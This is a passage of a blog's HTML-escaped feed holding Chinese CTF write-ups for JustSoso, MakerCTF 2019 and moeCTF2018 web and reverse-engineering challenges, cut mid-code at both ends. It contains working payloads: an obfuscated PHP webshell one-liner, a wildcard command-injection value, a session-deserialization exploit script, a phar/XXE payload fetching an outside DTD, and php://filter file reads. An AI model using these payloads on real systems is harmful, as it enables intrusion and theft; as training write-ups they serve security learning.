class="variable">$j</span> &lt; <span class="number">36</span>; <span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>[<span class="variable">$i</span>]^<span class="variable">$table</span>[<span class="variable">$j</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>[<span class="variable">$i</span>].<span class="string">&quot; &quot;</span>.<span class="variable">$table</span>[<span class="variable">$j</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// php test.php| strings | grep &quot;_&quot;</span></span><br><span class="line"><span class="comment">// php test.php| strings | grep &quot;G&quot;</span></span><br><span class="line"><span class="comment">// php test.php| strings | grep &quot;E&quot;</span></span><br><span class="line"><span class="comment">// php test.php| strings | grep &quot;T&quot;</span></span><br></pre></td></tr></table></figure><p>得到<code>&quot;1000&quot;^&quot;nwud&quot; == &quot;_GET&quot;</code><br>所以能够构造出一句话payload:<br><code>base_convert(1751504350,28,10)($&#123;decoct(512)^base_convert(862402,10,33)&#125;&#123;1&#125;)</code><br>即<code>system($_GET[1])</code></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JustSoso&quot;&gt;JustSoso&lt;/h2&gt;
&lt;div class=&#39;spoiler collapsed&#39;&gt;
    &lt;div class=&#39;spoiler-title&#39;&gt;
        题目源码
    &lt;/div&gt;
    &lt;div class=&#39;spoi</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://blog.frankli.site/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.frankli.site/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>MakerCTF 2019 部分Web题目 Writeup</title>
    <link href="https://blog.frankli.site/2019/04/15/Security/Writeup/MakerCTF%202019/"/>
    <id>https://blog.frankli.site/2019/04/15/Security/Writeup/MakerCTF%202019/</id>
    <published>2019-04-14T16:00:00.000Z</published>
    <updated>2021-04-11T21:38:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Pineapple">Pineapple</h2><p>通过扫描可以发现存在git源码泄露，进一步发现index.php中存在反序列化点:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$info</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>];</span><br><span class="line"><span class="variable">$lyric</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;lyric&#x27;</span>]; <span class="comment">// php://input</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$lyric</span>)&amp;&amp;(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$lyric</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I want to eat pineapple&quot;</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>及工具类Blog:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Blog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;Music&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;curl&quot;</span>, <span class="string">&quot;-&quot;</span>];</span><br><span class="line">        <span class="comment">// PATH中存在的文件名基本都ban了</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$value</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Attack!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;php ./templates/<span class="subst">$this</span>-&gt;file.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>且提示了flag存在于templates/Secrets.php文件中<br>显而易见，Blog类system函数的调用中存在命令拼接，而shell中的通配符可以帮助我们绕过waf<br>所以令 <code>Blog-&gt;file = &quot;;/???/???\t./templates/Secrets&quot;;</code> 即可</p><h2 id="Regex-and-PHP-are-the-best">Regex and PHP are the best</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>网上能搜到原题，此处总结一下各种可能能利用的函数</p><ol><li><code>getallheaders()</code> (在5.5.7之前只存在于apache php模块中)</li><li><code>get_defined_vars()</code></li><li><code>session_id(session_start())</code></li></ol><p>还存在一个比较刁钻的payload:<br><code>readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))))</code></p><h2 id="can-u-see-the-flag">can u see the flag</h2><p>首先通过extract变量覆盖读phpinfo：<code>func=extract&amp;func_0=phpinfo</code><br>可以发现php版本为7.0.33</p><p>回到变量覆盖，发现实际上无法直接进行反序列化，遂回到phpinfo继续寻找突破口</p><blockquote><p>其实此时可以通过fuzz找出可以接收一个数组作为参数的函数发现session反序列化</p></blockquote><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">session.serialize_handler</span> = php_serialize</span><br><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">On</span></span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">Off</span></span><br></pre></td></tr></table></figure><p>可以发现上述配置项允许我们通过session注入进行反序列化<br>再次回到变量覆盖，将<code>func_0</code>覆盖为<code>session_start</code>。<br>此时，要进行反序列化还需要更改<code>serialize_handler</code>，观察php文档发现session_start可以接受一个<code>$opts</code>参数更改session相关配置。之后就是烦人的套娃了</p><p>所以第一关的exploit如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> session</span><br><span class="line"></span><br><span class="line">ses = session()</span><br><span class="line">host = <span class="number">1</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">maker_r</span>:</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">maker_e</span>:</span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">maker_w</span>:</span><br><span class="line">            <span class="keyword">class</span> <span class="title class_">maker_q</span>:</span><br><span class="line">                <span class="keyword">class</span> <span class="title class_">get_flag</span>:</span><br><span class="line">                    get1 = <span class="string">&#x27;get_flag::flag1&#x27;</span></span><br><span class="line">                    protected_get2 = <span class="string">&#x27;\\f1a9&#x27;</span></span><br><span class="line">                q1 = get_flag()</span><br><span class="line">                private_q2 = <span class="literal">None</span></span><br><span class="line">            w1 = maker_q()</span><br><span class="line">            private_w2 = <span class="literal">None</span></span><br><span class="line">        e1 = maker_w()</span><br><span class="line">        private_e2 = <span class="literal">None</span></span><br><span class="line">    r1 = <span class="literal">None</span></span><br><span class="line">    r2 = maker_e()</span><br><span class="line"></span><br><span class="line">payload = serialize(maker_r())</span><br><span class="line"></span><br><span class="line">ses.get(host + <span class="string">&#x27;/welcome.php&#x27;</span>, params=&#123;</span><br><span class="line">    <span class="string">&#x27;func&#x27;</span>: <span class="string">&#x27;extract&#x27;</span>, <span class="string">&#x27;func_0&#x27;</span>: <span class="string">&#x27;session_start&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">ses.post(host + <span class="string">&#x27;/welcome.php&#x27;</span>, params=&#123;</span><br><span class="line">    <span class="string">&#x27;func&#x27;</span>: <span class="string">&#x27;extract&#x27;</span>, <span class="string">&#x27;func_0&#x27;</span>: <span class="string">&#x27;session_start&#x27;</span></span><br><span class="line">&#125;, files=&#123;<span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;b&#x27;</span>&#125;, data=&#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;|&#x27;</span> + payload</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># 此时session文件中的内容为：https://paste.ubuntu.com/p/QBsH3gyx8q/，挺有趣的</span></span><br><span class="line"></span><br><span class="line">ret = ses.post(host + <span class="string">&#x27;/welcome.php&#x27;</span>, params=&#123;</span><br><span class="line">    <span class="string">&#x27;func&#x27;</span>: <span class="string">&#x27;extract&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;func_0&#x27;</span>: <span class="string">&#x27;session_start&#x27;</span></span><br><span class="line">&#125;, data=&#123;</span><br><span class="line">    <span class="string">&#x27;serialize_handler&#x27;</span>: <span class="string">&#x27;php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;something&#x27;</span></span><br><span class="line">&#125;).text</span><br><span class="line"><span class="built_in">print</span>(ret)</span><br></pre></td></tr></table></figure><p>根据第一关的答案，我们能拿到第二关的源码，并且知道了第二关flag的位置。在classes.php中我们发现有两个key，其中admin_key没有给出，而出题人提示两个key的生成方式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Secret</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$maker_key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin_key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin_key = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">gen_secret</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;maker_key = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">gen_secret</span>(<span class="number">10</span>); <span class="comment">// )l)h3X3Gye</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gen_secret</span>(<span class="params"><span class="variable">$len</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()&#x27;</span>;</span><br><span class="line">        <span class="variable">$passwd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++ )</span><br><span class="line">            <span class="variable">$passwd</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$chars</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>mt_rand</code>随机数生成器非密码学安全<br>可以利用工具（比如php_mt_seed）爆破出seed，得到<code>admin_key = &quot;!XPiScRy&quot;</code><br>观察两个key的区别，我们能够发现maker_key只能将已经存在的<code>maker.gif</code>移动到<code>/var/www/data</code>目录下，且无法获得生成的文件名，而admin_key不仅可以访问/写入任意文件<strong>内容</strong>，还能获得生成的文件名<br>所以这个文件名有什么用呢？不能直接访问（不在web目录下），而我们能控制的能访问到本地文件的只有那个<code>file_get_contents</code>，这时我们就能联想到phar反序列化了</p><blockquote><p>有一个需要注意的点是file_get_contents的url第一个字符不能为p，此时我们可以通过套娃套一个stream即可，比如压缩流</p></blockquote><p>所以现在要反序列化什么类呢？如果只是要反序列化php自带的类的话那用第一关的反序列化点就行了，没必要再来一个，所以我们的目标缩小到classes中有的类。<br>这时我们能发现Move类能够调用任意类的任意函数，参数都没有任何限制，极大地扩展了攻击面。后面就随便搞了。</p><p>比如可以利用XXE读flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Move</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="string">&lt;&lt;&lt;str</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE foo [ &lt;!ENTITY % pe SYSTEM &quot;https://files.frankli.site/xxe/xxe.dtd&quot;&gt; %pe; %param1; ]&gt;</span></span><br><span class="line"><span class="string">&lt;foo&gt;&lt;/foo&gt;</span></span><br><span class="line"><span class="string">&amp;external;</span></span><br><span class="line"><span class="string">str</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;n = <span class="keyword">array</span>(<span class="variable">$d</span>, LIBXML_NOENT);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;m = <span class="string">&quot;SimpleXMLElement&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;k = <span class="string">&quot;!XPiScRy&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;payload.phar.gif&quot;</span>);</span><br><span class="line"><span class="variable">$x</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$x</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a &lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$x</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="keyword">new</span> <span class="title class_">Move</span>());</span><br><span class="line"><span class="variable">$x</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="variable">$x</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;payload.phar.gif&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    payload = base64.b64encode(f.read()).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">access</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> requests.post(<span class="string">&#x27;http://localhost/maker.php&#x27;</span>, params=&#123;</span><br><span class="line">        <span class="string">&#x27;who&#x27;</span>: <span class="string">&#x27;maker&#x27;</span>, <span class="string">&#x27;do&#x27;</span>: <span class="string">&#x27;move&#x27;</span>, <span class="string">&#x27;url&#x27;</span>: n</span><br><span class="line">    &#125;, data=&#123;<span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;!XPiScRy&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">ret1 = access(<span class="string">&#x27;data:text/plain;base64,&#x27;</span> + payload).text</span><br><span class="line">filename = <span class="built_in">__import__</span>(<span class="string">&#x27;re&#x27;</span>).findall(<span class="string">&#x27;[a-zA-Z0-9]*.gif&#x27;</span>, ret1)[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(access(<span class="string">&#x27;compress.zlib://phar:///var/www/maker/&#x27;</span> + filename).text)</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Pineapple&quot;&gt;Pineapple&lt;/h2&gt;
&lt;p&gt;通过扫描可以发现存在git源码泄露，进一步发现index.php中存在反序列化点:&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://blog.frankli.site/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.frankli.site/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>moeCTF2018</title>
    <link href="https://blog.frankli.site/2018/08/26/Security/Writeup/moeCTF2018/"/>
    <id>https://blog.frankli.site/2018/08/26/Security/Writeup/moeCTF2018/</id>
    <published>2018-08-25T16:00:00.000Z</published>
    <updated>2021-04-11T21:37:38.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>既然web组的人多。。那先写web？</p></blockquote><h2 id="WEB">WEB</h2><h4 id="Where-is-the-Flag">Where is the Flag?</h4><p>看源代码，flag在注释里</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>远在天边，近在眼前<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--moectf&#123;f12_is_th3_bAsic_way_t0_get_F1ag&#125;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="GET-POST">GET/POST</h4><p>用请求工具进行get/post请求，带个flag参数</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/moectf/get/index.php?flag=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>120.77.152.169:8088</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>moectf{GEt_13_the_ba5ic_method}<br>moectf{Post_1s_the_sEcond_Method}</p><h4 id="PHP是世界上坠吼的语言">PHP是世界上坠吼的语言</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$md5a</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$md5s</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$s</span> != <span class="variable">$a</span> &amp;&amp; <span class="variable">$md5a</span> == <span class="variable">$md5s</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php弱类型比较，常用md5:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(‘<span class="number">240610708</span>’) == <span class="title function_ invoke__">md5</span>(‘QNKCDZO’)</span><br><span class="line"><span class="title function_ invoke__">md5</span>(‘aabg7XSs’) == <span class="title function_ invoke__">md5</span>(‘aabC9RqS’)</span><br></pre></td></tr></table></figure><p>等等</p><p>php类型比较说明文档<br>PHP文件包含</p><p>?file=file.php</p><p>要读源码，加参数</p><p><code>php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>得到<br>PD9waHAKLy9tb2VjdGZ7TElGXzFTX3YzcnlfRWFTeX0K</p><p>base64解码后得到flag(好叭这个flag.php是猜的)<br>Parse_URL</p><p>……这是原题。<br>最好的语言里的parse_url()函数有个feature，当它接收到一个无法parse的url参数时会返回FALSE</p><blockquote><p>On seriously malformed URLs, parse_url() may return FALSE.</p></blockquote><p>php parse_url函数文档</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line"><span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_QUERY);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\w+/i&quot;</span>, <span class="variable">$url</span>))<span class="comment">#匹配[A-Z][a-z][0-9]和下划线</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>false当然不是character啦啦啦啦<br>所以把url里头的斜杠多写几个就可以啦<br>然后再配上一个小小的参数就爆flag了</p><p><code>?_=0</code></p><p>flag是啥？不重要了</p><h4 id="PHP弱类型的复仇">PHP弱类型的复仇</h4><p>先干啥好呢？F12啊</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/^(?=[1-9])(?=.[A-Z]).&#123;10,12&#125;$/&#x27;</span>;</span><br><span class="line"><span class="comment">#匹配以一个数字开头，紧跟一个大写字母的长度为10-12的串</span></span><br><span class="line"><span class="variable">$gugugu</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gugugu&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$gugugu</span>)===<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;正则看懂了嘛&quot;</span>;<span class="comment">#看懂啦</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$secret</span>=<span class="string">&quot;******&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$gugugu</span>==<span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;tqdl，给师傅递flag&lt;br&gt;&quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>。<br>这道题。。。。ORZ dalao。。。关键在于“以一个数字开头，紧跟一个大写字母的长度为10-12的串”如何表示一个数字，构造一个弱类型比较。<br>0x?小写。pass<br>然后我就智障了<br>1*100000000的计算结果?<br>哦</p><p><code>?gugugu=6E00000000</code></p><h4 id="不会的题">不会的题</h4><p>不会的题写什么wp</p><h4 id="白名单过滤xss">白名单过滤xss</h4><p>哦</p><blockquote><p>runtime error? reverse engineering?</p></blockquote><h2 id="RE">RE</h2><p>入场前请检查您是否带着您的毛(i)巾(da)</p><h4 id="re1">re1</h4><p>拖到ida里</p><p>找不到flag？View-&gt;Open Subviews-&gt;Strings</p><h4 id="re2">re2</h4><p>拖到ida里</p><p>Strings里找不到flag？实现一下F5出来的逻辑，反过来写一遍(实现一下反函数)</p><p><code>moectf&#123;Qidao_by_fa1con&#125;</code></p><h4 id="py逆向">py逆向</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/wibiti/uncompyle2.git</span><br><span class="line"><span class="built_in">cd</span> uncompyle2</span><br><span class="line">python setup.py install</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">uncompyle py.pyc</span><br></pre></td></tr></table></figure><p>然后同re2</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string orig=<span 